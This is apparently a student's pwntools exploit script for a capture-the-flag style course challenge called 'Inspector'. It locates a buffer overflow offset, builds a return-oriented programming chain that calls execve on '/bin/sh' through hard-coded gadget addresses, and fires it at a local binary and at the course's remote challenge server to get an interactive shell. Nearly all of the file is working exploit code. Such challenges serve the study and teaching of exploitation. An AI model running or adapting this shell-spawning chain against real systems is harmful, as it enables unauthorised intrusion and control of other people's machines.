from pwn import *
from pwnlib.util.packing import *
import re
import struct
import math

#############################################################
#	Inspector_Pwn.py										#
#	Lindsay Von Tish (lmv9443@nyu.edu)						#
#	Pwn 3: Inspector										#
#	03/13/2024												#
#############################################################

# A function to convert encoded input to a string and remove text format characters
#	Input: Encoded string
#	Output: Unencoded string
def cleanLine(ln):
	ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
	l = ansi_escape.sub('', str(ln, encoding='utf-8'))
	return l

# A function to find what part of the payload is being read as an address when the program crashes
#	Input: N/A
#	Output: N/A
def getOffset():
	p = process('./inspector')
	p.recvuntil("shell!")
	p.sendline(cyclic(100))
	p.wait()
	cf = p.corefile
	stack = cf.rsp
	info("rsp = %#x", stack)
	pattern = cf.read(stack, 4)
	offset = cyclic_find(pattern)
	info("offset = %d", offset)
	return 0

# A function to build the payload
#	Input: N/A
#	Output: Payload bytes
def buildPld():
	addrA = p64(0x0040062e)	# --> `pop rdi ; ret`
	datA = p64(0x00400708)	# --> `/bin/sh`
	addrB = p64(0x00400636)	# --> `pop rsi ; ret`
	addrC = p64(0x0040063e)	# --> `pop rdx ; ret`
	datBC = p64(0x00)
	addrD = p64(0x00400646)	# --> `pop rax ; ret`
	datD = p64(0x3b)
	addrE = p64(0x00400625)	# --> `syscall`
	addrF = p64(0x004004a9)	# --> `ret`
	pad = cyclic(40)

	pld = pad + addrA + datA + addrB + datBC + addrC + datBC + addrD + datD + addrE + addrF
	return pld

# A function to set breakpoints at each of the gadget addresses
#   It's written this way to be easy to read
#	Input: Connection
#	Output: N/A
def breakGadgets(p):
	addrA = '0x0040062e'
	addrB = '0x00400636'
	addrC = '0x0040063e'
	addrD = '0x00400646'
	addrE = '0x00400625'
	addrF = '0x004004a9'
	gadgetAddrs = [addrA, addrB, addrC, addrD, addrE, addrF]
	for a in gadgetAddrs:
		#print("break *" + a)
		p.sendline("break *" + str(a))
		p.recv()
	return 0

# A function to test payloads against inspector running with gdb
#	Input: N/A
#	Output: N/A
def testPld():
	p = process('/bin/bash')
	p.sendline('gdb ./inspector -q')
	p.sendline("break *0x00400678")
	breakGadgets(p)
	p.sendline("r")
	p.recv()
	p.sendline("c")
	p.recvuntil("shell!")
	p.sendline(buildPld())
	p.interactive()

# A function to attack a local instance of inspector
#	Input: N/A
#	Output: N/A
def pwnLocal():
	p = process('./inspector')
	p.recvuntil("shell!")
	p.sendline(buildPld())
	p.interactive()


# Host and port for the remote challenge
HOST = 'offsec-chalbroker.osiris.cyber.nyu.edu'
PORT = 1342

# A function to attack a remote instance of inspector
#	Input: N/A
#	Output: N/A
def pwnRemote():
	p = remote(HOST, PORT)
	p.recvuntil("shell!")
	p.sendline(buildPld())
	p.interactive()


# Uncomment to run
# getOffset()
# testPld()
# pwnLocal()
pwnRemote()